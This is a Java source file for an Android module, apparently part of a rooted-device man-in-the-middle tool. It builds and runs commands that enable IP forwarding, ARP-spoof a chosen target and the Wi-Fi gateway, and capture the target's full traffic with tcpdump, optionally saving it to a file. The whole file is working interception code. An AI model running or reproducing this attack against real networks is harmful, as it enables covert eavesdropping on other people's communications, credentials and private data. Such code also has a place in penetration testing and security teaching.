package it.uniroma2.giadd.aitm.models.modules;

import android.content.Context;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

import java.net.SocketException;
import java.util.List;

import it.uniroma2.giadd.aitm.managers.RootManager;
import it.uniroma2.giadd.aitm.managers.interfaces.OnCommandListener;
import it.uniroma2.giadd.aitm.utils.NetworkUtils;

/**
 * Created by Alessandro Di Diego on 13/08/16.
 */

public class SniffAllModule extends MitmModule implements Parcelable {

    private static final String TAG = SniffAllModule.class.getName();
    /**
     * Attention! If executing multilple commands in parallel, each command should be executed
     * in background (add & at the end) except the last command that it's needed to keep
     * the shell alive
     */
    private static final String ARP_SPOOF_COMMAND_1 = "arpspoof -i <interface> -t <target> <default gateway>";
    private static final String ARP_SPOOF_COMMAND_2 = "arpspoof -i <interface> -t <default gateway> <target>";
    private static final String TCPDUMP_COMMAND = "tcpdump host <target> -i <interface> -XSs 0 -w <path> and not arp and not rarp";
    private static final String TCPDUMP_COMMAND_NO_DUMP = "tcpdump host <target> -i <interface> -XSs 0 and not arp and not rarp";

    public SniffAllModule(Context context, String target, List<String> additionalCommands, String path) throws SocketException {
        super(context, additionalCommands);

        // enable forwarding
        addKernelRoutingCommand(true);

        // spoof client connection to gateway
        String command = context.getFilesDir() + "/" + ARP_SPOOF_COMMAND_1;
        String interfaceName = NetworkUtils.getActiveInterface(context);
        if (interfaceName == null) {
            Log.e(TAG, "Unable to get interface name!");
            interfaceName = "wlan0";
        }
        command = command.replaceAll("<interface>", interfaceName);
        command = command.replaceAll("<target>", target);
        String gateway = NetworkUtils.getWifiGateway(context);
        if (gateway == null) {
            Log.e(TAG, "Unable to get wifi gateway!");
            gateway = "";
        }
        command = command.replaceAll("<default gateway>", gateway);
        commands.add(command);

        //spoof gateway connection to client
        command = context.getFilesDir() + "/" + ARP_SPOOF_COMMAND_2;
        command = command.replaceAll("<interface>", interfaceName);
        command = command.replaceAll("<target>", target);
        command = command.replaceAll("<default gateway>", gateway);
        //commands.add(command);

        //dump to file
        setDumpToFile(false);
        command = context.getFilesDir() + "/" + TCPDUMP_COMMAND_NO_DUMP;
        if (path != null && !path.isEmpty()) {
            setDumpToFile(true);
            command = context.getFilesDir() + "/" + TCPDUMP_COMMAND;
            command = command.replaceAll("<path>", path);
        }
        command = command.replaceAll("<interface>", interfaceName);
        command = command.replaceAll("<target>", target);
        commands.add(command);
    }


    @Override
    public void onModuleTermination(Context context) {
        RootManager.killByName(context, "tcpdump", RootManager.SIGINT, new OnCommandListener() {
            @Override
            public void onShellError(int exitCode) {
                Log.d(TAG, "ERROR: EXIT CODE:" + exitCode);
            }

            @Override
            public void onCommandResult(int commandCode, int exitCode) {
                Log.d(TAG, "tcpdump terminated; EXIT CODE:" + exitCode);
            }

            @Override
            public void onLine(String line) {
                Log.d(TAG, "LINE: " + line);
            }
        });

        RootManager.killByName(context, "arpspoof", RootManager.SIGINT, new OnCommandListener() {
            @Override
            public void onShellError(int exitCode) {
                Log.d(TAG, "ERROR: EXIT CODE:" + exitCode);
            }

            @Override
            public void onCommandResult(int commandCode, int exitCode) {
                Log.d(TAG, "Arpsoof terminated; EXIT CODE:" + exitCode);
                RootManager rootManager = new RootManager();
                rootManager.execSuCommandsAsync(getKernelRoutingCommands(false), 1, null);
            }

            @Override
            public void onLine(String line) {
                Log.d(TAG, "LINE: " + line);
            }
        });
    }

    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel dest, int flags) {
        dest.writeStringList(this.commands);
        dest.writeByte(this.dumpToFile ? (byte) 1 : (byte) 0);
        dest.writeString(this.binaryFolder);
    }

    protected SniffAllModule(Parcel in) {
        this.commands = in.createStringArrayList();
        this.dumpToFile = in.readByte() != 0;
        this.binaryFolder = in.readString();
    }

    public static final Parcelable.Creator<SniffAllModule> CREATOR = new Parcelable.Creator<SniffAllModule>() {
        @Override
        public SniffAllModule createFromParcel(Parcel source) {
            return new SniffAllModule(source);
        }

        @Override
        public SniffAllModule[] newArray(int size) {
            return new SniffAllModule[size];
        }
    };
}
